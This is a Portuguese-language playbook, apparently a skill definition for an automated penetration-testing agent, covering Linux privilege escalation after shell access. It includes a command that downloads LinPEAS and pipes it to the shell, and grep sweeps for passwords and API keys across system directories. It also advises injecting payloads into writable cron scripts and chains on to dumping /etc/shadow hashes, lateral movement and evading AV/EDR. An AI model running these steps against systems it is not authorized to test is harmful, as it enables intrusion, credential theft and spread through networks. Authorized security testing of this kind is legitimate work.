---
name: linux_privilege_escalation
phase: 5_post_exploitation
tools: [linpeas, sudo, find, getcap]
dependencies: [linux_shell_obtained]
mitre_tactic: TA0004 (Privilege Escalation)
---

# Objetivo
Escalar privilégios de um usuário comum para root em sistemas Linux, explorando misconfigurations, SUID binaries, capabilities, cron jobs, kernel exploits e credenciais em texto claro.

# Condições de Execução
- Acesso shell (reverse shell ou SSH) ao sistema Linux foi obtido.
- O usuário atual NÃO é root.

# Comandos e Sintaxe

## 1. LinPEAS (Enumeração Automatizada)
```bash
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>&1 | tee {workspace}/linpeas_output.txt
```

## 2. Verificações Manuais Rápidas

### Sudo
```bash
sudo -l 2>&1 | tee {workspace}/sudo_privesc.txt
```

### SUID Binaries
```bash
find / -perm -4000 -type f 2>/dev/null | tee {workspace}/suid_binaries.txt
```

### Capabilities
```bash
getcap -r / 2>/dev/null | tee {workspace}/capabilities.txt
```

### Cron Jobs
```bash
cat /etc/crontab 2>/dev/null | tee {workspace}/crontab.txt
ls -la /etc/cron.* 2>/dev/null | tee -a {workspace}/crontab.txt
```

### Credenciais em Arquivos
```bash
grep -rli "password\|passwd\|secret\|api_key" /etc/ /home/ /var/ /opt/ 2>/dev/null | head -50 | tee {workspace}/credential_files.txt
```

### Kernel Version
```bash
uname -a | tee {workspace}/kernel_info.txt
cat /etc/os-release >> {workspace}/kernel_info.txt
```

# Análise de Resultados
- **`sudo -l` retorna "(ALL) NOPASSWD":** Root direto via `sudo su` ou `sudo /bin/bash`.
- **`sudo -l` retorna binário específico (ex: `vim`, `python`, `find`):** Consulte GTFOBins (https://gtfobins.github.io/) para técnica de escalação.
- **SUID em binários incomuns:** Consulte GTFOBins para verificar se o binário pode ser abusado.
- **Capabilities `cap_setuid` em binário:** Pode ser usado para escalar privilégios.
- **Cron job executando script com permissão de escrita:** Injete payload no script para obter root na próxima execução.
- **Kernel antigo:** Busque kernel exploits com a skill `cve_search_engine`.

# Próximos Passos
- Se obtiver root, acione a skill `hash_dumping_and_cracking` para extrair hashes de `/etc/shadow`.
- Se o sistema fizer parte de uma rede, acione a skill `lateral_movement_psexec` para movimento lateral.

# Tratamento de Erros
- Se `curl` não estiver disponível, use `wget` ou `python -c "import urllib..."`.
- Se o LinPEAS for bloqueado por AV/EDR, execute as verificações manuais individualmente.
